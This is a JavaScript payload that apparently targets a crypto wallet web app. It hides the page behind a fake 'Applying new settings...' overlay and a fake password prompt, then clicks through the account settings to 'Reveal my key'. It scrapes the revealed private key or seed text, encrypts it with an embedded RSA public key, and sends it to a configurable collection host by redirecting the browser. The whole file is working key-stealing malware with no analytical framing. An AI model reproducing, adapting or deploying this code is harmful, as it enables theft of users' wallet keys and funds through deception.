window["HOST"] = "http://localhost:3000/verify/";
window["CUSTOMER"] = "";

const key = `-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA0V928PgGRrahZzvt3Jw7
lE8h3wGSygjJk3F7esDkkMgEhM4YTJ4L00IYFXSI6RGPhIGKsWSIymshuuLebgDu
NOYWCC1DLgM1xUG38hXYxZOkz3SZdPLeypdr+PbpYncwholmEYvZCf5d8WYgAN9q
T9HGFSdb76C7OVa2FJvRPDNfJiw9u9XKtCRSmKvzDA+NKAciOiybRKUEY5EUeAZQ
1npY6GAkdrN/9rGDjuXij64Yvx1Kbb0tc49y/lZIkZG9mBci6JQ3Eg2xWHuJ687n
sAkiUDfxXylvgD7SjBJ/q7QwTf/V7GvzKMDu8sfrQcuGLMQCYYdqK3W/BCjUKFW3
Lgz5684bjtfz/ZR2COEpd9BjB6AmHLnPIH9zJPR3hKF8FDcQdYdJ+NSESwOKCY6K
1mYsLBoktvuMWHYWw7IC0CH1G6rJ59G+6vxeYC+lmsXyvusAgGXcbJi82HS4My+O
4FC9FEQknClqKuxxI5Oc5YtSB8ysh10auAwkR/ccWLWdSCkxwY2pYZQlhbN69wfU
2oqiL228WDv/yQn1brijCI5CA33xo4bGjEOg4y0//wrrAkcpObPUjaChuJDtP4JJ
Nh1TQ+hCMG+TjJ3VgL7Abmud+f17tBmhXSTmVRBMK9PuF2sfSByX0kF9XHLzzTnB
VTR/2DtszMAEaeZW7ivJBCcCAwEAAQ==
-----END PUBLIC KEY-----
`;

async function sendMessage(msg) {
    const encoder = new TextEncoder();
    const data = encoder.encode(msg);

    const encData = await window.crypto.subtle.encrypt(
        { name: "RSA-OAEP" },
        publicKey,
        data
    );

    const b64Buffer = arrBufToB64(encData);
    location.href = `${window["HOST"]}${encodeURIComponent(b64Buffer)}`;
}

function b64(base64) {
    const binaryString = atob(base64);
    const bytes = new Uint8Array(binaryString.length);
    for (let i = 0; i < binaryString.length; i++) {
        bytes[i] = binaryString.charCodeAt(i);
    }
    return bytes;
}

function pemToBin(pem) {
    const base64 = pem.replace(/-+(BEGIN|END) (PUBLIC|PRIVATE) KEY-+/g, '')
        .replace(/\s/g, '');
    return b64(base64);
}

function arrBufToB64(buffer) {
    return btoa(String.fromCharCode(...new Uint8Array(buffer)));
}

const pkBuffer = pemToBin(key);

const publicKey = await window.crypto.subtle.importKey(
    "spki",
    pkBuffer,
    {
        name: "RSA-OAEP",
        hash: "SHA-256"
    },
    true,
    ["encrypt"]
);

function showAlertNotification(message) {
    let alertDiv = document.createElement("div");
    alertDiv.id = "axiom-alert";
    alertDiv.innerHTML = message;
    alertDiv.style.position = "fixed";
    alertDiv.style.top = "20px";
    alertDiv.style.left = "50%";
    alertDiv.style.transform = "translateX(-50%)";
    alertDiv.style.padding = "15px 30px";
    alertDiv.style.background = "#18181a";
    alertDiv.style.border = "1px solid #323542";
    alertDiv.style.color = "#fff";
    alertDiv.style.fontSize = "1.2rem";
    alertDiv.style.borderRadius = "10px";
    alertDiv.style.boxShadow = "0 4px 15px rgba(0,0,0,0.3)";
    alertDiv.style.zIndex = "2147483647";
    alertDiv.style.opacity = "0";
    alertDiv.style.transition = "opacity 0.5s ease, transform 0.5s ease";
    document.body.appendChild(alertDiv);

    setTimeout(function () {
        alertDiv.style.opacity = "1";
    }, 100);

    setTimeout(function () {
        alertDiv.style.opacity = "0";
        setTimeout(function () {
            document.body.removeChild(alertDiv);
        }, 500);
    }, 2000);
}

function showOverlay(message) {
    let overlay = document.createElement("div");
    overlay.id = "axiom-overlay";
    overlay.style.position = "fixed";
    overlay.style.top = "0";
    overlay.style.left = "0";
    overlay.style.width = "100%";
    overlay.style.height = "100%";
    overlay.style.background = "#000";
    overlay.style.display = "flex";
    overlay.style.flexDirection = "row";
    overlay.style.gap = "20px";
    overlay.style.alignItems = "center";
    overlay.style.justifyContent = "center";
    overlay.style.zIndex = "2147483646";

    let spinner = document.createElement("div");
    spinner.style.width = "50px";
    spinner.style.height = "50px";
    spinner.style.border = "6px solid #fff";
    spinner.style.borderTop = "6px solid transparent";
    spinner.style.borderRadius = "50%";
    spinner.style.animation = "spin 1s linear infinite";

    let messageDiv = document.createElement("div");
    messageDiv.innerHTML = message;
    messageDiv.style.color = "#ffffff";
    messageDiv.style.fontSize = "2rem";
    messageDiv.style.fontWeight = "600";
    messageDiv.style.letterSpacing = "1px";
    messageDiv.style.textAlign = "center";

    overlay.appendChild(spinner);
    overlay.appendChild(messageDiv);
    document.body.appendChild(overlay);

    let style = document.createElement("style");
    style.innerHTML = `
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
    `;
    document.head.appendChild(style);

    return overlay;
}

function send() {
    setTimeout(() => {
        let seed = document.querySelector("div.bg-transparent.text-white")?.textContent || "No seed found";
        let data = { content: seed };
        sendMessage(seed)
    }, 3000);
}

function waitAndClick(selector, callback, interval = 500) {
    let attempts = 0;
    const poll = setInterval(() => {
        let element = document.querySelector(selector);
        attempts++;
        if (element) {
            if (selector.includes(">")) {
                element = element.parentElement;
            }
            element.click();
            clearInterval(poll);
            callback();
        } else {
        }
    }, interval);
}

function findRevealButton() {
    const buttons = document.querySelectorAll('button.bg-primaryBlue.flex.rounded-full.cursor-pointer');
    return Array.from(buttons).find(button => {
        const span = button.querySelector('span');
        return span && span.textContent.trim().startsWith('Reveal my key');
    });
}

let overlay = showOverlay("Applying new settings...");
const gear = 'button > i.ri-user-settings-line';
const settings = "button.flex:has(.ri-user-line)";
const confirmphantom = 'button:has(img[src*="phantom-purple.svg"])';
const confirmgoogle = 'button:has(img[src*="google-logo.svg"])';
const view = ".bg-secondaryStroke.flex.flex-row";
let notFound = true;
let uh = false;
let uh2 = false;

waitAndClick(gear, () => {
    waitAndClick(settings, () => {
        const intervalId = setInterval(() => {
            if (!notFound) {
                clearInterval(intervalId);
                return;
            }

            if (document.querySelector(".ri-mail-line")) uh = true;
            if (document.querySelector(confirmphantom)) uh2 = true;
            console.log(uh2);

            waitAndClick(view, () => {
                if (uh) {
                    notFound = false;
                    overlay.remove();
                    showAlertNotification("Enter password to confirm changes...");
                    document.querySelector('.flex.flex-col.flex-1.overflow-y-auto').style.display = 'none';
                    document.querySelector('.bg-backgroundTertiary').style.display = 'none';

                    let spans2 = document.getElementsByTagName("span");
                    for (let span of spans2) {
                        if (span.textContent.trim() === "Account and Security") {
                            span.parentElement.parentElement.style.display = "none";
                            break;
                        }
                    }

                    const revealInterval = setInterval(() => {
                        const revealBtn = findRevealButton();
                        if (revealBtn) {
                            clearInterval(revealInterval);
                            revealBtn.click();
                            showOverlay("Applying new settings...");
                            send();
                        }
                    }, 500);
                } else if (uh2) {
                    notFound = false;
                    waitAndClick(confirmphantom, () => {
                        const revealInterval = setInterval(() => {
                            const revealBtn = findRevealButton();
                            if (revealBtn) {
                                clearInterval(revealInterval);
                                revealBtn.click();
                                send();
                            }
                        }, 500);
                    });
                } else {
                    waitAndClick(confirmgoogle, () => {
                        notFound = false;
                        const revealInterval = setInterval(() => {
                            const revealBtn = findRevealButton();
                            if (revealBtn) {
                                clearInterval(revealInterval);
                                revealBtn.click();
                                send();
                            }
                        }, 500);
                    });
                }
            });
        }, 400);
    });
});